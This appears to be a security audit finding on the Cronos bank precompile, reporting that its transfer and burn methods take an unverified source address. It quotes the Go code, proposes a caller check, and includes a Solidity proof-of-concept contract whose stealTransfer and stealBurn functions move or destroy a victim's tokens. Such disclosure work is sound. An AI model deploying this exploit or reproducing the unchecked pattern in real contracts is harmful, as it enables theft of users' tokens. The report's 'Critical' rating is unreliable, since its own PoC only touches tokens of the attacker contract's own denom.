### Title
Unauthorized Transfer/Burn of Native `evm/` Tokens via Unchecked `sender` Parameter in Bank Precompile - (File: x/cronos/keeper/precompiles/bank.go)

### Summary
The `BankContract` precompile's `transfer` and `burn` methods accept an arbitrary address argument as the token source without verifying it equals `contract.Caller()`. Any EVM contract can invoke these methods with a victim's address as `sender`/`addr`, causing the precompile to move or destroy native `evm/<callerContract>` tokens from the victim's account without their authorization.

### Finding Description
In `BankContract.Run()`, the `TransferMethodName` case unpacks `sender` directly from call arguments and passes it as `from` to `bankKeeper.SendCoins`:

```go
sender := args[0].(common.Address)   // line 175 – caller-supplied, not verified
...
from := sdk.AccAddress(sender.Bytes())
...
if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
``` [1](#0-0) 

Similarly, the `BurnMethodName` case unpacks `recipient` (the address to burn *from*) from call arguments and passes it directly to `bankKeeper.SendCoinsFromAccountToModule` without any caller check:

```go
recipient := args[0].(common.Address)   // line 121 – caller-supplied
...
addr := sdk.AccAddress(recipient.Bytes())
...
if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...); err != nil {
``` [2](#0-1) 

At no point is `contract.Caller()` compared against the supplied address. The denom is derived from `contract.Caller()` (line 130/186), so the operation acts on tokens of denom `evm/<callerContract>`. Any contract that calls the bank precompile can therefore specify any address as the source of funds. [3](#0-2) 

The intended usage pattern (as shown in `TestBank.sol`) is for the calling contract to pass `msg.sender` as the source address:

```solidity
function moveFromNative(uint256 amount) public returns (bool) {
    bool result = bank.burn(msg.sender, amount);   // correct: uses msg.sender
    ...
}
``` [4](#0-3) 

But the precompile itself does not enforce this invariant. Any contract can pass an arbitrary address.

### Impact Explanation
An unprivileged attacker deploys `MaliciousContract`. Through it they call `bank.transfer(victim, attacker, amount)`. The precompile uses `contract.Caller() = MaliciousContract` to derive denom `evm/MaliciousContract`, then calls `bankKeeper.SendCoins(ctx, victim, attacker, coins)` — moving the victim's native `evm/MaliciousContract` tokens to the attacker with no authorization check. Likewise, `bank.burn(victim, amount)` destroys the victim's tokens. This is an unauthorized transfer/burn of precompile-controlled assets, matching the Critical impact tier.

Additionally, any legitimate CRC20-style contract that exposes a `transfer(from, to, amount)` wrapper over the bank precompile (a natural pattern) becomes immediately exploitable: an attacker calls it with `from = victim` to drain `evm/<legitimateContract>` tokens from any holder.

### Likelihood Explanation
The bank precompile is a public, permissionless EVM precompile at address `0x0000000000000000000000000000000000000064`. Any deployed contract can call it. The missing check is a single line. Any contract that wraps the bank precompile with a user-supplied `from` parameter — a natural and common pattern — is immediately exploitable by an unprivileged EOA.

### Recommendation
In both the `BurnMethodName` and `TransferMethodName` cases, enforce that the supplied source address equals `contract.Caller()`:

```go
// TransferMethodName
sender := args[0].(common.Address)
if sender != contract.Caller() {
    return nil, errors.New("sender must be the caller")
}

// BurnMethodName
recipient := args[0].(common.Address)
if recipient != contract.Caller() {
    return nil, errors.New("burn target must be the caller")
}
``` [5](#0-4) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
    function burn(address addr, uint256 amount) external payable returns (bool);
}

contract BankPrecompileExploit {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: attacker mints evm/<this> tokens to victim via a separate mint call
    // Step 2: attacker calls stealTransfer to move victim's evm/<this> tokens
    function stealTransfer(address victim, address attacker, uint256 amount) external {
        // denom = evm/<address(this)>
        // no check that msg.sender == victim in the precompile
        bank.transfer(victim, attacker, amount);
    }

    function stealBurn(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

1. Attacker deploys `BankPrecompileExploit` at address `0xEXPLOIT`.
2. Victim holds native tokens of denom `evm/0xEXPLOIT` (e.g., received via a prior `bank.mint` call through the same contract).
3. Attacker calls `BankPrecompileExploit.stealTransfer(victim, attacker, amount)`.
4. The precompile executes `bankKeeper.SendCoins(ctx, victim, attacker, evm/0xEXPLOIT coins)` — no authorization check, transfer succeeds. [6](#0-5)

func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
	case BalanceOfMethodName:
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		token := args[0].(common.Address)
		addr := args[1].(common.Address)
		// query from storage
		balance := bc.bankKeeper.GetBalance(stateDB.Context(), sdk.AccAddress(addr.Bytes()), EVMDenom(token)).Amount.BigInt()
		return method.Outputs.Pack(balance)
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
	default:
		return nil, errors.New("unknown method")
	}
}
